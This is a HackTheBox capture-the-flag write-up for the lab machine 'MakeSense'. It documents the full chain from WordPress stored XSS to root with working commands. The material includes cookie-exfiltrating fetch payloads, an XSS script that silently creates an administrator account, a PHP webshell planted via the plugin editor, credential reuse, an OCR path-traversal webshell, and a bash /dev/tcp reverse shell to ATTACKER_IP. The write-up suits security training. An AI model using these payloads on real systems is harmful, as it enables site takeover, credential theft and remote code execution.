# MakeSense — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**IP:** `$TARGET`  
**Domain:** `makesense.htb`  
**Tech Stack:** Apache 2.4.58, WordPress 7.0, MySQL, PHP built-in dev server (root), Pillow/OCR service

---

## Attack Chain Overview

```
WordPress stored XSS (contact form) → cookie exfiltration
   → Upload dir fuzzing → voice message WAV file
   → Whisper transcription → jake:ClearLightNiceSmooth4923
   → XSS + CSRF → create admin user via admin's authenticated session
   → WordPress plugin editor → PHP webshell → www-data shell
   → wp-config.php → walter:JbhHDAEgXvri3! → SSH as walter
   → ss/ps → PHP dev server on 127.0.0.1:8001 running as root (/root/ocr4/)
   → SSH port forward → OCR submit PHP payload image → save as .php
   → RCE as root via /root/ocr4/saved/shell.php
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [WordPress Scan](#2-wordpress-scan)
3. [Stored XSS via Contact Form](#3-stored-xss-via-contact-form)
4. [Voice Message Discovery and Credential Extraction](#4-voice-message-discovery-and-credential-extraction)
5. [XSS-Driven Admin User Creation](#5-xss-driven-admin-user-creation)
6. [RCE via WordPress Plugin Editor](#6-rce-via-wordpress-plugin-editor)
7. [DB Credentials and SSH as walter](#7-db-credentials-and-ssh-as-walter)
8. [Privilege Escalation — OCR Service Path Traversal](#8-privilege-escalation--ocr-service-path-traversal)
9. [Root Flag](#9-root-flag)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
nmap -sVC -p22,443 $TARGET -oN service
```

**Output:**
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: WordPress 7.0
|_http-title: Agency LLC
| ssl-cert: Subject: commonName=makesense.htb
```

Add vhost:

```bash
echo "$TARGET makesense.htb" | sudo tee -a /etc/hosts
```

Only HTTPS (port 443). WordPress 7.0 on Apache with a self-signed cert. All subsequent requests need `-k` (ignore TLS warnings).

Related notes: [nmap](../../../tools/recon/nmap.md)

---

## 2. WordPress Scan

```bash
# Full scan
wpscan --url https://makesense.htb

# Aggressive plugin enumeration
wpscan --url https://makesense.htb --enumerate p --plugins-detection aggressive

# User enumeration (skip TLS check)
wpscan --url https://makesense.htb --enumerate u --disable-tls-checks
```

**Output:**
```
[+] akismet
 | Location: https://makesense.htb/wp-content/plugins/akismet/
 | Latest Version: 5.7
-------------------------------------------
[+] Users: admin, walter, jake
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Discovered three users: `admin`, `walter`, `jake`. No immediately exploitable plugins, so moved on to application-level attack surfaces.

Related notes: [wpscan](../../../tools/web/wpscan.md)

---

## 3. Stored XSS via Contact Form

The site has a contact form that accepts a name, email, phone, and message. Tested for stored XSS — injected a fetch payload that would exfiltrate cookies when an admin reviewed the submission:

```bash
# Start listener
sudo ncat -lvnp 80 --keep-open --no-shutdown

# Submit malicious contact form
curl -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "action=submit_contact_form" \
  --data-urlencode "nonce=9e39546208" \
  --data-urlencode "name=<script>fetch('http://10.10.15.26/name?'+document.cookie)</script>" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode "phone=123456" \
  --data-urlencode "message=<script>fetch('http://10.10.15.26/message?'+document.cookie)</script>" -k
```

The callback returned `wp-settings-time-3=1783425209` — a non-auth cookie (settings preferences, not a session token). Useful for fingerprinting that the admin reviewed the message, but not sufficient for hijacking the admin session directly.

**Why we kept going with XSS anyway:** if we could make the admin's browser perform authenticated actions on our behalf (CSRF-style via fetch), we didn't need the raw session cookie.

---

## 4. Voice Message Discovery and Credential Extraction

Fuzzing the upload directory revealed a WAV file:

```
https://makesense.htb/wp-content/uploads/2026/01/
```

The uploads directory contained `.wav` voice messages. One was a recording of `jake` testing a new feature — he accidentally said his password aloud.

Transcribed with Whisper:

```bash
whisper voice-message.wav --model tiny --language en
```

**Output:**
```
[00:00.000 --> 00:05.080]  Hey this is Jake, I'm testing the new feature, and it's neck-siding, I'm going near
[00:05.080 --> 00:13.360]  Oops, lug in, thumb, Jake, clear, light, nice, smooth, four, nice, two, three.
```

Parsing the transcription: "log in … Jake … clear, light, nice, smooth, four, nine, two, three" → `ClearLightNiceSmooth4923`

```
Username: jake
Password: ClearLightNiceSmooth4923
```

Related notes: [whisper](../../../tools/forensics/whisper.md)

---

## 5. XSS-Driven Admin User Creation

Logged in as `jake` but his role lacked the permissions needed to install plugins or edit themes. We needed admin access.

The stored XSS was still active — any time an admin reviewed the contact form messages, our JavaScript executed in their browser in an authenticated context. We leveraged this to have the admin's browser create a new administrator account via a CSRF-style fetch chain:

```html
<script>
fetch('/wp-admin/user-new.php')
  .then(r => r.text())
  .then(html => {
    const match = html.match(/name="_wpnonce_create-user" value="([^"]+)"/);
    if (match) {
      const nonce = match[1];
      fetch('/wp-admin/user-new.php', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'action=createuser&_wpnonce_create-user=' + nonce +
              '&user_login=hacker&email=hacker@test.com&pass1=Hacker123!&pass2=Hacker123!&role=administrator'
      }).then(r => {
        fetch('http://10.10.15.26/created?status=' + r.status);
      });
    }
  });
</script>
```

**Output on our listener:**
```
GET /created?status=200 HTTP/1.1
```

We now had full WordPress admin access as `hacker:Hacker123!`.

**Why this works:** the fetch call runs in the admin's browser with their active session. The two-step nonce extraction + POST mirrors exactly what a human admin would do in the UI — WordPress's CSRF protection (the nonce) is bypassed because we read it from the DOM first.

Full technique: [wordpress-xss-csrf-admin-creation](../../../exploits/web-auth/wordpress-xss-csrf-admin-creation.md)

---

## 6. RCE via WordPress Plugin Editor

With admin access, navigated to **Plugins → Plugin File Editor** and selected the Akismet plugin. Injected a PHP webshell into its `header.php` (or any other file that gets included on page load):

```php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
    exit;
}
```

Verified RCE:

```bash
curl -s -k "https://makesense.htb/?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Related notes: [wordpress-theme-editor-webshell](../../../exploits/web-rce/wordpress-theme-editor-webshell.md)

---

## 7. DB Credentials and SSH as walter

Read `wp-config.php` via the webshell:

```bash
curl -k "https://makesense.htb/?cmd=cat%20wp-config.php"
```

**Output:**
```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
```

Walter's DB password was reused for his SSH account:

```bash
ssh walter@$TARGET
# password: JbhHDAEgXvri3!
cat /home/walter/user.txt
```

**User flag captured.**

---

## 8. Privilege Escalation — OCR Service Path Traversal

### Discovering the Root Process

```bash
ps aux | grep -v grep | grep -i root
```

**Output:**
```
root  1361  /bin/bash /root/.scripts/start_ocr4.sh
root  1405  php -S 127.0.0.1:8001 -t /root/ocr4/
```

A PHP built-in dev server was running as **root**, serving files from `/root/ocr4/` on localhost only. PHP dev servers spawned without a router script will serve any `.php` file statically — if we can write a PHP file into the webroot, we get RCE as root.

### Port Forwarding to the OCR Service

```bash
ssh -L 8001:127.0.0.1:8001 walter@$TARGET -N -f
```

The OCR service uses HTTP Basic Auth reusing walter's credentials:

```bash
curl -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
```

### Understanding the OCR Application

The app is a canvas-based handwriting recognizer:

1. The user draws on an HTML5 `<canvas>`.
2. `sendCanvas()` serializes the canvas to a PNG (`canvas.toDataURL('image/png')`) and POSTs it as `canvas_image`.
3. The backend runs OCR on the image and returns recognized text along with an `ocr_id` (e.g. `ocr_6a4d05a918c5c6.85274710`), bound to the PHP session.
4. A second form lets you POST `ocr_id`, `filename`, and `save_output` to **save the recognized text to a file** under `saved/` inside the webroot.

**Attack primitive:** if we can get the OCR engine to recognize a valid PHP payload and then save it with a `.php` extension inside the webroot, the PHP dev server will execute it as root.

### Generating a Clean Payload Image

Hand-drawing a PHP payload and hoping OCR reads it perfectly is unreliable. Generate a PNG with clean typography using Pillow:

```python
#!/usr/bin/env python3
from PIL import Image, ImageDraw, ImageFont

text = "<?php system($_GET['cmd']); ?>"

img = Image.new('RGB', (900, 200), color='white')
draw = ImageDraw.Draw(img)

font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 32)
draw.text((20, 70), text, fill='black', font=font)
img.save('payload.png')
```

Convert to a data URI (as expected by the canvas form):

```bash
echo -n "data:image/png;base64,$(base64 -w0 payload.png)" > payload_b64.txt
```

### Step 1 — Submit the Image for OCR

The `ocr_id` is bound to the PHP session (`PHPSESSID` cookie). Both the OCR submission and the save request must share the same session or the save will fail with `Invalid OCR request. Cannot save.` — use a cookie jar (`-c`/`-b`) for both requests.

```bash
curl -s -u walter:JbhHDAEgXvri3! -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image@payload_b64.txt" -o step1.html
```

The OCR recognized the payload exactly:
```
<?php system($_GET['cmd']); ?>
```

### Step 2 — Save with Path Traversal

```bash
OCR_ID=$(grep -oP 'name="ocr_id" value="\K[^"]+' step1.html)
echo "[+] OCR ID: $OCR_ID"

curl -s -u walter:JbhHDAEgXvri3! -c cookies.txt -b cookies.txt -X POST http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$OCR_ID" \
  --data-urlencode "filename=../shell.php" \
  --data-urlencode "save_output=" -o step2.html

grep -E "notice|error|success" step2.html
```

**Output:**
```
[+] OCR ID: ocr_6a4d06c7208308.89727194
<p class="notice success reveal">Saved as: saved/shell.php</p>
```

The traversal `../shell.php` was normalized to `saved/shell.php` by the app, but the file is directly accessible from the webroot.

### Root RCE

```bash
curl -s -u walter:JbhHDAEgXvri3! "http://127.0.0.1:8001/saved/shell.php?cmd=id"
# uid=0(root) gid=0(root) groups=0(root)
```

Optional reverse shell for interactive access:

```bash
# On attacker machine:
nc -lvnp 4444

# Trigger:
curl -s -G "http://127.0.0.1:8001/saved/shell.php" -u walter:JbhHDAEgXvri3! \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

Full technique: [ocr-save-path-traversal-rce](../../../exploits/web-rce/ocr-save-path-traversal-rce.md)

---

## 9. Root Flag

```bash
curl -s -G "http://127.0.0.1:8001/saved/shell.php" -u walter:JbhHDAEgXvri3! \
  --data-urlencode "cmd=cat /root/root.txt"
```

**Root flag captured.**

---

## 10. Key Takeaways

1. **Stored XSS without session cookies is still powerful.** Even when the exfiltrated cookies are non-auth preference cookies, the admin's authenticated browser context can perform state-changing actions via `fetch()` + nonce extraction — classic XSS-to-CSRF chaining.
2. **WAV files in upload directories contain secrets.** Audio/voice message files in web uploads are routinely overlooked. Whisper makes transcription trivial even on CPU with the `tiny` model.
3. **Root-owned PHP dev servers are a common privesc path.** `php -S` run by root as a convenience daemon creates a trivially exploitable webshell-write-to-root-RCE path. `ps aux | grep -i root` and `ss -tulpn` should always be your first two post-foothold commands.
4. **OCR sessions are stateful.** The `ocr_id` binding to `PHPSESSID` is a gotcha — if you switch curl sessions between the submit and save steps you'll get a cryptic "Invalid OCR request" error. Always persist cookies with `-c`/`-b`.
5. **Generate payload images programmatically.** Using Pillow + a monospace font to render the payload as an image is orders of magnitude more reliable than hand-drawing on a canvas and hoping the OCR recognizes it correctly.
6. **Password reuse from wp-config.php → SSH.** Always try DB usernames and passwords directly against SSH, sudo, and any other login surface before doing any further enumeration.

---

## Related Notes

- [wordpress-xss-csrf-admin-creation](../../../exploits/web-auth/wordpress-xss-csrf-admin-creation.md)
- [wordpress-theme-editor-webshell](../../../exploits/web-rce/wordpress-theme-editor-webshell.md)
- [ocr-save-path-traversal-rce](../../../exploits/web-rce/ocr-save-path-traversal-rce.md)
- [whisper](../../../tools/forensics/whisper.md)
- [wpscan](../../../tools/web/wpscan.md)
- [ssh](../../../tools/pivot/ssh.md)
- [nmap](../../../tools/recon/nmap.md)